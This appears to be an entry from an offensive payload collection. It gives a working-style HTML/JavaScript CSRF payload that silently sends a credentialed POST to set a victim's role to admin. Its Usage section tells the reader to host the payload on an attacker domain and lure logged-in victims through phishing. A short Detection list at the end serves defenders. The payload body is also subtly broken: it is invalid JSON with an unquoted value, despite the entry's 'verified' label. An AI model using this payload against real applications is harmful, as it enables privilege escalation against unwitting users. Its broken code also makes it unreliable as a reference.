---
id: 2cc93e97-b2cd-4823-a1d7-d3477537a0b1
type: code
name: html-csrf-json-post-payload
language: HTML
verified: true
created_at: '2023-04-06T03:55:55.549184+00:00'
updated_at: '2023-04-06T03:55:55.552531+00:00'
tags:
  - csrf
  - json-post
  - payload
platforms:
  - Web
validated: true
---

# html-csrf-json-post-payload

## Code

```html
<script>
var xhr = new XMLHttpRequest();
xhr.open("POST", "http://www.example.com/api/setrole");
xhr.withCredentials = true;
xhr.setRequestHeader("Content-Type", "application/json;charset=UTF-8");
xhr.send('{"role":admin}');
</script>
```

## Description

This HTML code snippet contains a JavaScript payload designed for a CSRF attack. When loaded in a victim's browser, it automatically sends a forged POST request to the target API endpoint to set the user's role to 'admin' using their existing session credentials. The script uses XMLHttpRequest for the request, includes credentials via withCredentials, and specifies JSON content type.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| http://www.example.com/api/setrole | Target API endpoint URL for role update | http://targetapp.com/api/setrole |
| {"role":admin} | JSON payload to set the role | {"role":"admin"} |

## Usage

Embed this script in an HTML page hosted on an attacker-controlled domain. Lure the authenticated victim to visit the page via phishing or social engineering. The request fires on page load, exploiting the victim's session without interaction. Customize the URL and payload to match the target's API.

## Detection

- Browser developer tools or network logs showing unexpected cross-origin POST requests with JSON payloads.
- Application logs for role changes without corresponding UI actions or from suspicious referers.
- Web Application Firewall (WAF) rules detecting credentialed requests from untrusted origins.
- Client-side monitoring for XMLHttpRequest to sensitive endpoints.

## Related

- [[procedures/json-post-csrf-to-set-admin-role]]
